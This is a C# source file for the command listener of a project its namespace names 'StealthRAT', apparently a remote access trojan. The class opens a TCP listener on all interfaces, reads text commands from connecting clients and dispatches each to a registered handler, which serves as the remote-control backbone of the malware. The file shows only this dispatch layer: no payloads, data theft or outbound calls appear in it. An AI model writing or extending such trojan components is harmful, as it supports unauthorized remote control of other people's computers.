using System.Net;
using System.Net.Sockets;
using System.Text;
using StealthRAT.Interfaces;
using StealthRAT.Models;

namespace StealthRAT.Services;

/// <summary>
/// Manages the command listener service that accepts TCP connections
/// and dispatches incoming commands to the appropriate handlers.
/// Implements the Command pattern for extensible command processing.
/// </summary>
public sealed class CommandService : IDisposable
{
    private readonly ILoggerService _logger;
    private readonly Dictionary<string, ICommandHandler> _handlers;
    private TcpListener? _listener;
    private bool _disposed;

    /// <summary>
    /// Initializes a new instance of the <see cref="CommandService"/> class.
    /// </summary>
    /// <param name="logger">The logging service for recording operational events.</param>
    /// <param name="handlers">Collection of command handlers to register.</param>
    public CommandService(ILoggerService logger, IEnumerable<ICommandHandler> handlers)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));

        // Build a lookup dictionary for O(1) command dispatch
        _handlers = new Dictionary<string, ICommandHandler>(StringComparer.OrdinalIgnoreCase);
        foreach (ICommandHandler handler in handlers)
        {
            _handlers[handler.CommandName] = handler;
        }
    }

    /// <summary>
    /// Starts listening for command connections on the configured port.
    /// Each connected client can send multiple commands in a session.
    /// </summary>
    /// <param name="cancellationToken">Token to signal graceful shutdown.</param>
    public async Task StartAsync(CancellationToken cancellationToken)
    {
        _listener = new TcpListener(IPAddress.Any, ServerConfiguration.CommandPort);
        _listener.Start();
        _logger.LogInfo($"Command service started on port {ServerConfiguration.CommandPort}");

        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                TcpClient client = await _listener.AcceptTcpClientAsync(cancellationToken);
                _logger.LogInfo($"New command client connected: {client.Client.RemoteEndPoint}");
                _ = HandleClientSessionAsync(client, cancellationToken);
            }
        }
        catch (OperationCanceledException)
        {
            _logger.LogInfo("Command service shutting down gracefully");
        }
        catch (Exception ex)
        {
            _logger.LogError("Command listener encountered an error", ex);
        }
        finally
        {
            _listener.Stop();
        }
    }

    /// <summary>
    /// Handles a client session, reading and processing commands until
    /// the client disconnects or cancellation is requested.
    /// </summary>
    /// <param name="client">The connected TCP client.</param>
    /// <param name="cancellationToken">Token to signal cancellation.</param>
    private async Task HandleClientSessionAsync(TcpClient client, CancellationToken cancellationToken)
    {
        using (client)
        await using (NetworkStream stream = client.GetStream())
        using (var reader = new StreamReader(stream, Encoding.UTF8, leaveOpen: true))
        await using (var writer = new StreamWriter(stream, Encoding.UTF8, leaveOpen: true) { AutoFlush = true })
        {
            try
            {
                while (!cancellationToken.IsCancellationRequested && client.Connected)
                {
                    string? line = await reader.ReadLineAsync(cancellationToken);
                    if (string.IsNullOrEmpty(line)) break;

                    _logger.LogInfo($"Command received: {line.Trim()}");
                    string response = await DispatchCommandAsync(line.Trim(), writer, stream, cancellationToken);

                    if (!string.IsNullOrEmpty(response))
                    {
                        await writer.WriteLineAsync(response);
                    }
                }
            }
            catch (OperationCanceledException)
            {
                // Expected during shutdown
            }
            catch (IOException ex)
            {
                _logger.LogError("Client connection lost", ex);
            }
            catch (Exception ex)
            {
                _logger.LogError("Error processing client command", ex);
            }
        }
    }

    /// <summary>
    /// Parses the command line and dispatches to the appropriate handler.
    /// Returns an error message if the command is not recognized.
    /// </summary>
    /// <param name="commandLine">The raw command line string.</param>
    /// <param name="writer">The response writer.</param>
    /// <param name="stream">The network stream for raw data operations.</param>
    /// <param name="cancellationToken">Token to signal cancellation.</param>
    /// <returns>The command response string.</returns>
    private async Task<string> DispatchCommandAsync(
        string commandLine,
        StreamWriter writer,
        NetworkStream stream,
        CancellationToken cancellationToken)
    {
        string[] parts = commandLine.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length == 0) return "ERR: Empty command";

        string commandName = parts[0];
        string[] args = parts.Skip(1).ToArray();

        if (_handlers.TryGetValue(commandName, out ICommandHandler? handler))
        {
            var context = new CommandContext
            {
                Writer = writer,
                Stream = stream,
                CancellationToken = cancellationToken
            };

            return await handler.ExecuteAsync(args, context);
        }

        _logger.LogWarning($"Unknown command: {commandName}");
        return $"ERR: Unknown command '{commandName}'. Available commands: {string.Join(", ", _handlers.Keys)}";
    }

    /// <summary>
    /// Releases resources used by the command service.
    /// </summary>
    public void Dispose()
    {
        if (!_disposed)
        {
            _listener?.Stop();
            _disposed = true;
        }
    }
}
